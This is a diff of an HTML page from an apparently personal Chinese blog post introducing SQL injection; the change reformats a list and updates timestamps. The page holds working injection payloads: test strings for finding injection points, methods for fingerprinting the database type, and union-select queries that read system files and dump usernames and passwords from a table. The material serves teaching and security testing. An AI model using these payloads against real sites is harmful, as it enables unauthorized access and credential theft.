@@ -13,7 +13,7 @@
 <meta property="og:site_name">
 <meta property="og:description" content="SQL注入分析介绍">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-01T14:19:02.467Z">
+<meta property="og:updated_time" content="2019-04-01T14:20:47.572Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入">
 <meta name="twitter:description" content="SQL注入分析介绍">
@@ -275,15 +275,23 @@
 <h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a><font color="#3399FF">SQL注入攻击</font></h1><hr>
 <ol>
 <li>SQL注入点判断(一般存在形式：<font color="#66FFFF">/abc.asp?id=XX</font>)：<br>1：如果URL中传递的参数(一般为id)是数字，测试<font color="#66FFFF">id=2-1</font>与<font color="#66FFFF">id=1</font>返回的结果是否相同，如果做了2-1=1的运算，说明可能存在<font color="#66FFFF">数字型注入</font>。如果要用<font color="#66FFFF">+号</font>运算的话，因为URL编码的问题，需要把加好换成<font color="#66FFFF">%2B</font>，如<font color="#66FFFF">id=1%2B1</font>。<br>2：在参数后面加<font color="#66FFFF">单引号</font>或<font color="#66FFFF">双引号</font>，判断返回结果是否有报错。<br>3：添加注释符，判断前后是否有报错，如<font color="#66FFFF">id=1’ –+ </font>或 <font color="#66FFFF">id=1” –+ </font>或<font color="#66FFFF">id=1’ # </font>或<font color="#66FFFF">id=1” –+ </font>（–后面跟+号，是把+当成空格使用）。<br>4：有些参数可能在括号里面，如：SELECT first_name, last_name FROM users WHERE user_id = （’$id’）；所以也可以在参数后面加单双引号和括号，如i<font color="#66FFFF">d=1’)  –+ </font>或 <font color="#66FFFF">id=1”) –+ </font>或<font color="#66FFFF">id=1’) # </font>或<font color="#66FFFF">id=1”) –+ </font>。<br>5：参数后面跟<font color="#66FFFF">or</font> 或者<font color="#66FFFF">and</font>，判断返回结果是否有变化，如<font color="#66FFFF">1’ or ‘a’=’a  </font>或者<font color="#66FFFF">and ‘a’=’a</font>或者<font color="#66FFFF">1’ or ‘a’=’b</font>或者<font color="#66FFFF">1’ or ‘1’=’2</font>。<br>6：如果返回的正确页面与错误页面都一样，可以考虑<font color="#66FFFF">时间延迟</font>的方法判断是否存在注入，如  <font color="#66FFFF">1’ and sleep(5)</font>。<br>7：注：<font color="#66FFFF">Class=连续剧</font> 这类注入的参数是字符型；<font color="#66FFFF">ID=49</font> 这类注入的参数是数字型。</li>
-<li>数据库类型判断：<br> 1： 基于特定函数判断：<pre><code>- &lt;font color=#66FFFF&gt;len&lt;/font&gt;和&lt;font color=#66FFFF&gt;length&lt;/font&gt;：在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。当你使用&lt;font color=#66FFFF&gt;and len(&apos;a&apos;)=1&lt;/font&gt;的时候，返回正常页面时，可以推断当前的数据库类型可能是mssql，或mysql，或是db2。反之则可能会是oracle和informix。
-- &lt;font color=#66FFFF&gt;@@version&lt;/font&gt;和&lt;font color=#66FFFF&gt;version()&lt;/font&gt;：在mysql内，可以用@@version或是version()来返回当前的版本信息。但无法判断是mysql还是mssql时，可以用version()函数来构造判断。version()&gt;1 返回与@@version&gt;1 相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。
-3： &lt;font color=#66FFFF&gt;substring&lt;/font&gt;和&lt;font color=#66FFFF&gt;substr&lt;/font&gt;：在mssql中可以调用substring。oracle则只可调用substr
-</code></pre> 2： 基于辅助的符号判断：<pre><code>1： &lt;font color=#66FFFF&gt;/* &lt;/font&gt;是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下查询字符;
-2： &lt;font color=#66FFFF&gt;-- &lt;/font&gt;是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符;
-3： &lt;font color=#66FFFF&gt;;  &lt;/font&gt;是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。
-4： &lt;font color=#66FFFF&gt;and exists (select count( 星号 ) from sysobjects)&lt;/font&gt;：意思是查询sysobjects表里记录数大于,返回正常的，说明大于0且存在sysobjects这个表，因为这个表只有MSSQL数据库才有，所以可以判断为MSSQL数据库。返回错误则表示不是。&lt;font color=#66FFFF&gt;and exists (select count( 星号 ) from msysobjects)&lt;/font&gt;：这句提交是不会返回正常页面的，就算是ACCESS数据库也不会返回正常。因为默认情况下我们没有权限查询这个表里的数据。WEB会提示我们“记录无法读取;&apos;msysobjects&apos;没有读取权限”，如果返回的是这个错误信息的话，那就证明是ACCESS数据库了。第一条返回正常，就是MSSQL数据库，如果两条都不正常，那就是ACCESS数据库了。以上参数都是int的时候，如果是字符型的话首先在参数后面加上单引号，然后再在查询语句后加上;--
-</code></pre> 3： 基于显示错误信息判断：<pre><code>注入点后直接加上&lt;font color=#66FFFF&gt;单引号&lt;/font&gt;，根据服务器的报错信息来判断数据库。错误提示Microsoft JET Database Engine 错误 &apos;80040e14&apos;，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。
-</code></pre></li>
+<li>数据库类型判断：<ul>
+<li>基于特定函数判断：<ul>
+<li><font color="#66FFFF">len</font>和<font color="#66FFFF">length</font>：在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。当你使用<font color="#66FFFF">and len(‘a’)=1</font>的时候，返回正常页面时，可以推断当前的数据库类型可能是mssql，或mysql，或是db2。反之则可能会是oracle和informix。</li>
+<li><font color="#66FFFF">@@version</font>和<font color="#66FFFF">version()</font>：在mysql内，可以用@@version或是version()来返回当前的版本信息。但无法判断是mysql还是mssql时，可以用version()函数来构造判断。version()&gt;1 返回与@@version&gt;1 相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。</li>
+<li><font color="#66FFFF">substring</font>和<font color="#66FFFF">substr</font>：在mssql中可以调用substring。oracle则只可调用substr</li>
+</ul>
+</li>
+<li>基于辅助的符号判断：<ul>
+<li><font color="#66FFFF">/* </font>是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下查询字符;</li>
+<li><font color="#66FFFF">– </font>是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符;</li>
+<li><font color="#66FFFF">;  </font>是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</li>
+<li><font color="#66FFFF">and exists (select count( 星号 ) from sysobjects)</font>：意思是查询sysobjects表里记录数大于,返回正常的，说明大于0且存在sysobjects这个表，因为这个表只有MSSQL数据库才有，所以可以判断为MSSQL数据库。返回错误则表示不是。<font color="#66FFFF">and exists (select count( 星号 ) from msysobjects)</font>：这句提交是不会返回正常页面的，就算是ACCESS数据库也不会返回正常。因为默认情况下我们没有权限查询这个表里的数据。WEB会提示我们“记录无法读取;’msysobjects’没有读取权限”，如果返回的是这个错误信息的话，那就证明是ACCESS数据库了。第一条返回正常，就是MSSQL数据库，如果两条都不正常，那就是ACCESS数据库了。以上参数都是int的时候，如果是字符型的话首先在参数后面加上单引号，然后再在查询语句后加上;–</li>
+</ul>
+</li>
+<li>基于显示错误信息判断：<br>  注入点后直接加上<font color="#66FFFF">单引号</font>，根据服务器的报错信息来判断数据库。错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。</li>
+</ul>
+</li>
 <li>手工注入常用语句：<br>1： <font color="#66FFFF">xxx.php?id=2900 and 1=1    </font>：组合判断是否存在注入点。<br>2： <font color="#66FFFF">xxx.php?id=2900 and 1=2    </font>：组合判断注入点，若返回错误同时1=1正确，则存在注入点<br>3： <font color="#66FFFF">xxx.php?id=2900 and ‘1’=’1’</font>：错误则说明PHP开启了magic_quotes_gpc=on，不能直接利用注入语句写webshell了。<br>4： <font color="#66FFFF">xxx.php?id=2900 order by 15</font>：尝试当前注入语句的表中字段个数从大到小，错误说明数字偏大。<br>5： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14</font>：联合查询语句，暴出可显示字段。<br>6： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(user(),0x5e5e,version(),0x5e5e,database(),0x5e5e,@@basedir),7,8,9,10,11,12,13,14</font>：暴出数据库用户、版本、库名和路径信息。<br>7： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,load_file(0x633a5c626f6f742e696e69),7,8,9,10,11,12,13,14</font>：读取windows系统文件boot.ini。<br>8： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(table_name),7,8,9,10,11,12,13,14 from information_schema.tables where table_schema=database()</font>：暴出当前库中的所有表名。<br>9： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(column_name),7,8,9,10,11,12,13,14 from information_schema.columns where table_name=0x6163636f756e74</font>：暴出account表中的所有字段名。<br>10： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(username,0x5e,password),7,8,9,10,11,12,13,14 from account</font>：暴出username和password字段里的内容。</li>
 </ol>
 <h1 id="SQL注入盲注"><a href="#SQL注入盲注" class="headerlink" title="SQL注入盲注"></a><font color="#3399FF">SQL注入盲注</font></h1><hr>
@@ -376,7 +384,7 @@
         <p><span>本文标题:</span><a href="/2019/03/31/SQL注入/">SQL注入</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Hussar 的个人博客">Hussar</a></p>
         <p><span>发布时间:</span>2019年03月31日 - 22时33分</p>
-        <p><span>最后更新:</span>2019年04月01日 - 22时19分</p>
+        <p><span>最后更新:</span>2019年04月01日 - 22时20分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/03/31/SQL注入/" title="SQL注入">https://Hussar118.github.io/2019/03/31/SQL注入/</a>
             <span class="copy-path" data-clipboard-text="原文: https://Hussar118.github.io/2019/03/31/SQL注入/　　作者: Hussar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
